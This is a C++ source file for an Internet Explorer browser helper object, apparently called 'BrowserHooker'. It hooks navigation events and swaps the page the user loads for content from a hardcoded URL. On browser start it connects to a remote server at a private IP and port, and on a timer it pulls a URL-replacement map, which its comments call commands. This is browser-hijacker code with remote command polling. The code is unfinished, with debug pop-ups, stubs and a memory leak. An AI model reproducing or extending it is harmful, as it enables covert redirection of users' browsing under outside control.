// Redirector.cpp : Implementation of CRedirector
#include "stdafx.h"
#include "BrowserHooker.h"
#include "Redirector.h"

#pragma comment(lib, "urlmon.lib")
//#pragma comment(lib, "user32.lib")

// for _variant_t _bstr_t support
//#include <comutil.h>
//#pragma comment(lib, "comsuppw.lib")
//#pragma comment(lib, "bufferoverflowu.lib")

map<string, string>  g_urlMap;

// for timer.
CClientDaemon       *g_pClientDaemon;
void CALLBACK GetCommandFromServer(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime);

// for test.
#define __HTMLContent OLESTR("<html><head><title>Hello world!</title></head><body>\
<object width=\"400\" height=\"340\"><param name=\"movie\" \
value=\"http://www.tudou.com/v/r_z_HOUvW-M\"></param>\
<param name=\"allowScriptAccess\" value=\"always\"></param>\
<param name=\"wmode\" value=\"transparent\"></param>\
<embed src=\"http://www.tudou.com/v/ek977kGpDWk\" \
type=\"application/x-shockwave-flash\" \
width=\"400\" height=\"340\" allowFullScreen=\"true\" \
wmode=\"transparent\" allowScriptAccess=\"always\"></embed></object>\
</body></html>")

#undef __HTMLContent
#define __HTMLContent OLESTR(\
"<html><head></head>\
<body>\
<image src=\"http://www.google.cn/intl/zh-CN/images/logo_cn.gif\" />\
<iframe src=\"http://www.google.cn\"></iframe>\
</body></html>")

/////////////////////////////////////////////////////////////////////////////
// CRedirector

STDMETHODIMP CRedirector::SetSite(IUnknown* pUnkSite)
{
	// Attributes initialization.
	m_replacedUrl = SysAllocString(OLESTR("http://www.yahoo.cn/"));
	m_origUrl = SysAllocString(OLESTR(""));
	m_oldUrl = SysAllocString(OLESTR(""));
	m_bLocationUrlChanged = TRUE;
	m_bReplaced = FALSE;

	m_sServerAddr = "192.168.1.3";
	m_uServerPort = 6789;

    if (pUnkSite != NULL)
    {
        // Cache the pointer to IWebBrowser2.
        HRESULT hr = pUnkSite->QueryInterface(IID_IWebBrowser2, (void**)&m_spWebBrowser);
		if(SUCCEEDED(hr)){
			// Register to sink events from DWebBrowserEvents2.
			hr = DispEventAdvise(m_spWebBrowser);
			if (SUCCEEDED(hr))
            {
                m_fAdvised = TRUE;

				// 标识当前窗口是主窗口
				m_bMainWindow = TRUE;
				// Retrieve the top-level window from the site.
				// here we need to know which windows common type is used instead of long.
				// here you can get all IWebBrowser2 properties through get_propertyname method.
				HRESULT hr = m_spWebBrowser->get_HWND((long*)&m_ParentWindow);
				if (!SUCCEEDED(hr))
				{
					// Output a message box when page is loaded.
					OutputDebugString(_T("SetSite Failed!"));
				}else{
					//MessageBox(m_ParentWindow, _T("SetSite successful!"), _T("BrowserHooker"), MB_OK);
					//m_replacePageContent = m_pHttpRequest->HttpGet("http://www.google.cn");
				}

				//CRedirector::m_pClientDaemon = new CClientDaemon(m_sServerAddr, m_uServerPort);

				StartClientDaemon(m_ParentWindow);
            }
		}
    }
    else
    {
		// Unregister event sink.
        if (m_fAdvised)
        {
            DispEventUnadvise(m_spWebBrowser);
            m_fAdvised = FALSE;
        }

		m_bMainWindow = FALSE;

		if(g_pClientDaemon){
			delete g_pClientDaemon;
			g_pClientDaemon = NULL;
		}

        // Release cached pointers and other resources here.
        m_spWebBrowser.Release();
		SysFreeString(m_origUrl);
		SysFreeString(m_oldUrl);
		SysFreeString(m_replacedUrl);
    }

    // Return the base class implementation
    return IObjectWithSiteImpl<CRedirector>::SetSite(pUnkSite);
}



/*
 * 当用户输入一个url时，需要先判断该url是否在替换的范围内，如果是的话，需要调用相应的函数
 * 修改HTTP头，改掉原始url，替换为指定url
 **/
void STDMETHODCALLTYPE CRedirector::OnBeforeNavigate2(IDispatch *pDisp,
											VARIANT *url,
											VARIANT *Flags,
											VARIANT *TargetFrameName,
											VARIANT *PostData,
											VARIANT *Headers,
											VARIANT_BOOL *Cancel
											){
	// 如果url在需要替换的url列表中，则替换成相应的url
	// 下面的语句无效，不能将浏览器重定向到http://www.google.cn
	// url->bstrVal = L"http://www.google.cn";
	// *Cancel = VARIANT_FALSE;
//	BSTR str = L"";
//	str += L"Current URL: " + url->bstrVal + L"\n";
//	str += L"Current Frame: " + TargetFrameName->bstrVal + L"\n";
//	BSTR locationUrl;
//	m_spWebBrowser->get_LocationURL(&locationUrl);
//	MessageBox(m_ParentWindow, locationUrl, _T("Test"), MB_OK);
//	if(!m_bNeedReplace && _tcscmp(url->bstrVal, m_replacedUrl)){
//		m_bNeedReplace = TRUE;
//	}
}
/*
 * 1. DWebBrowserEvents2::BeforeNavigate2 Event will hook the http request.
 * 2. http request header must be delimit by "\r\n".
 * 3. http://blog.csdn.net/norsd/archive/2008/12/11/3499371.aspx - 一些关于BeforeNavigate2的用法.
 * 4. socket通信 - http://social.msdn.microsoft.com/forums/en-US/ieextensiondevelopment/thread/c65802c2-857b-452c-92d5-f218058a3ea3/
 * 5. http://msdn.microsoft.com/en-us/library/bb774479(VS.85).aspx Url Search Hook
 * 6. http://topic.csdn.net/u/20080314/15/c47cebdd-bd1e-4db2-8963-1309cae5ee17.html
**/

void STDMETHODCALLTYPE CRedirector::OnDownloadBegin(void){

}

// 可以在这个事件触发的时候修改html页面
// Loading HTML content from a Stream:
// 1. http://msdn.microsoft.com/en-us/library/aa752047(VS.85).aspx
// 2. http://qualapps.blogspot.com/2008/10/how-to-load-mshtml-with-data.html
// 3. http://www.codeproject.com/KB/IP/parse_html.aspx?fid=3219&df=90&mpp=25&noise=3&sort=Position&view=Quick&select=1262040
void STDMETHODCALLTYPE CRedirector::OnDownloadComplete(void){
}

// 在事件NavigateComplete2中替换页面，这样就不会存在被替换的页面已经显示了，才做
// 替换的问题，参考文章:
// http://topic.csdn.net/u/20081002/11/35E04C64-3403-4AE6-BD68-23EEB9D62BEB.html

/*
 * Write a custom implementation of IMoniker interface.
 * You only need a non-trivial implementation of two methods: BindToStorage
 * should return the IStream with your HTML content, and GetDisplayName
 * should return the base URL you want to use to resolve relative links.
 * You then use IPersistMoniker to feed the content into MSHTML using this
 * custom implementation, instead of IPersistStreamInit.
 *
 **/
void STDMETHODCALLTYPE CRedirector::OnNavigateComplete2(IDispatch *pDisp, VARIANT *vtUrl)
{
	IDispatch *iDisp = NULL;
	IHTMLDocument2 *iDoc = NULL;
	
	HRESULT hr = m_spWebBrowser->get_Document(&iDisp);
	if(SUCCEEDED(hr)){
		hr = iDisp->QueryInterface(IID_IHTMLDocument2, (void **)&iDoc);
		if(SUCCEEDED(hr)){
			// no effect.
			//iDoc->put_URL(OLESTR("http://search.microsoft.com/"));

			//MessageBox(m_ParentWindow, (LPCTSTR)m_origUrl, _T("BrowserHooker"), MB_OK);
			//VARIANT_BOOL pVB;
			//hr = m_spWebBrowser->get_RegisterAsBrowser(&pVB);
			m_spWebBrowser->get_LocationURL(&m_origUrl);
			//MessageBox(m_ParentWindow, m_origUrl, _T("test"), MB_OK);
			if(!_tcscmp(m_origUrl, m_oldUrl)){
				m_bLocationUrlChanged = FALSE;
			}else{
				m_bLocationUrlChanged = TRUE;
				// here need to reset the m_bReplaced switch.
				m_bReplaced = FALSE;
			}

			if(m_bLocationUrlChanged){
				m_spWebBrowser->get_LocationURL(&m_origUrl);
				BSTR rootUrl = SysAllocStringLen(m_origUrl, SysStringLen(L"http://www.google.cn/"));
				if(!m_bReplaced && _tcscmp(rootUrl, _T("http://www.google.cn/"))){
					ReplacePageWithUrl(iDoc, "http://www.google.cn/");
					m_bReplaced = TRUE;
					// Do I need to call this event handler here manually? Answer: no.
					//OnDocumentComplete(pDisp, vtUrl);
				}

				SysFreeString(rootUrl);

				// Copy current location url to m_oldurl.
				m_oldUrl = SysAllocStringLen(m_origUrl, SysStringLen(m_origUrl));
			}
		}
	}
}

/*
 * 当IE启动时，需要触发这个事件，然后通过socket连接远程server端，更新客户端状态，并获取指令
**/
void STDMETHODCALLTYPE CRedirector::OnDocumentComplete(IDispatch *pDisp, VARIANT *pvarURL){

    //MessageBox(m_ParentWindow, _T("DocumentComplete!"), _T("BrowserHooker"), MB_OK);
		
	//LPOLESTR lpw = new WCHAR[20];

	// for MBCS mode it seems not work.
	//MultiByteToWideChar(CP_UTF8, MB_PRECOMPOSED, (LPCSTR)origUrl, -1, lpw, 20);
	// reference - http://msdn.microsoft.com/en-us/library/e0z9k731.aspx
	// unicode字符串比较实用wcscmp, ascii是strcmp, 通用的方式是使用_tcscmp这个函数
	// 会根据_UNICODE & _MBCS的定义情况自动选择合适的比较函数
	// strcmp  => ASCII
	// wcscmp  => UNICODE
	// _mbscmp => MBCS
	//HRESULT hr;
	if(_tcscmp(m_origUrl, _T("http://www.google.cn/"))){
		OutputDebugString(_T("OnDocumentComplete"));
		/*hr = m_spWebBrowser->Navigate(L"http://www.google.cn/", NULL, NULL, NULL, NULL);
		if(SUCCEEDED(hr)){
			m_spWebBrowser->put_Visible(VARIANT_TRUE);
			
		}else{
			m_spWebBrowser->Quit();
		}
		*/
	}
}

// Helper function defination section.
int CRedirector::MyStrToOleStrN(LPOLESTR pwsz, int cchWideChar, LPCSTR psz)
{
    int i;
    i=MultiByteToWideChar(CP_ACP, 0, psz, -1, pwsz, cchWideChar);
    if (!i)
    {
        pwsz[cchWideChar-1]=0;
    }
    else
        ZeroMemory(pwsz+i, sizeof(OLECHAR)*(cchWideChar-i));

    return i;
}

BOOL CRedirector::isSameRootDomain(BSTR url, BSTR domain){

	return FALSE;
}
// reference http://msdn.microsoft.com/en-us/library/ms687200(VS.85).aspx
// for IMoniker interface
void CRedirector::WriteHTMLToDoc_OLD(IHTMLDocument2* iDoc, string url){
	HRESULT hr = S_OK;
	VARIANT *param;
	SAFEARRAY *sfArray;
	m_pHttpRequest = new CHttpRequest();

	m_replacePageContent = m_pHttpRequest->HttpGet(url);

	BSTR bstr = SysAllocString((BSTR)m_replacePageContent.c_str());

	// for debug.
	OutputDebugString((LPCTSTR)bstr);

	// Creates a new one-dimensional array
	sfArray = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	
	if (sfArray == NULL || iDoc == NULL) {
		goto cleanup;
	}

	hr = SafeArrayAccessData(sfArray,(LPVOID*)&param);
	param->vt = VT_BSTR;
	param->bstrVal = bstr;
	hr = SafeArrayUnaccessData(sfArray);
	hr = iDoc->write(sfArray);

cleanup:
	SysFreeString(bstr);
	if (sfArray != NULL) {
		SafeArrayDestroy(sfArray);
	}
}

int CRedirector::ReplacePageWithUrl(IHTMLDocument2 *iDoc, const char* pszUrl)
{
	HRESULT hr;
    IHTMLDocument2 *pDoc = iDoc;
    IMoniker *pmk = NULL;
    IPersistMoniker *pPersistmk = NULL;
    PSTR pszErr = NULL;
    IBindCtx *pbc = NULL;
    LONG len;
    WCHAR *pwszUrl;

	int i;

    len = lstrlenA(pszUrl);
    
    pwszUrl = (WCHAR *)LocalAlloc(LMEM_FIXED, (len + 1)*sizeof(WCHAR));

	i = 0;
    i = MultiByteToWideChar(CP_ACP, 0, pszUrl, -1, pwszUrl, len);
	if(0 == i){
		pwszUrl[len-1]=0;
	}else{
		ZeroMemory(pwszUrl+i, sizeof(OLECHAR)*(len-i));
	}

	// Get IPersistMoniker pointer.
    hr = pDoc->QueryInterface(IID_IPersistMoniker, (void **)&pPersistmk);
	// Create Url Moniker.
    hr = CreateURLMoniker(NULL, pwszUrl, &pmk);
	// Create BindCtx object.
    hr = CreateBindCtx(0, &pbc);
    if((!pbc) || FAILED(hr))
        goto done;
    
    hr = pPersistmk->Load(FALSE, pmk, pbc, 0);

    if(pPersistmk)
    {
        pPersistmk->Release();
        pPersistmk = NULL;
    }
    
done: // Clean up.
    LocalFree(pwszUrl);
	pwszUrl = NULL;

	if(pbc){
		pbc->Release();
		pbc = NULL;
	}

	if(pmk){
		pmk->Release();
		pmk = NULL;
	}

    return 0;
}

int CRedirector::ReplacePageWithHtml(IHTMLDocument2 *iDoc, BSTR htmlContent){

	return 0;
}

//////////////////////////////////////////////////////////////////////////////
///  Networking communication related functions defination.
//////////////////////////////////////////////////////////////////////////////

void CALLBACK GetCommandFromServer(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime){
	if(uMsg != WM_TIMER){
		return;
	}

	g_urlMap = g_pClientDaemon->GetUrlMapFromServer();
	map<string, string>::iterator iter;
	for(iter = g_urlMap.begin(); iter!=g_urlMap.end(); iter++){
		// for debug.
		OutputDebugString((LPCTSTR)(iter->first).c_str());
		MessageBox(hwnd, (LPCTSTR)(iter->first).c_str(), _T("Timer"), MB_OK);
		OutputDebugString((LPCTSTR)(iter->second).c_str());
		MessageBox(hwnd, (LPCTSTR)(iter->second).c_str(), _T("Timer"), MB_OK);
	}

	//MessageBox(hwnd, _T("Enter GetCommandFromServer"), _T("Timer"), MB_OK);
}

#define IDT_CLIENTDAEMON_TIMER  0x101
#define CONNECT_INTERVAL        20000
// here there is a problem with setTimer, because it need a static function.
void CRedirector::StartClientDaemon(HWND hMainWnd){
	UINT uResult;

	// initialize the m_pClientDaemon static variable.
	g_pClientDaemon = new CClientDaemon(m_sServerAddr, m_uServerPort);

	// TimerProc must be a global function or a static class member function.
	uResult = ::SetTimer(hMainWnd,
					   IDT_CLIENTDAEMON_TIMER,
					   CONNECT_INTERVAL,
					   (TIMERPROC)GetCommandFromServer
					   );
	if (uResult == 0)
	{ 
		OutputDebugString(_T("Successfully!"));
	}
}
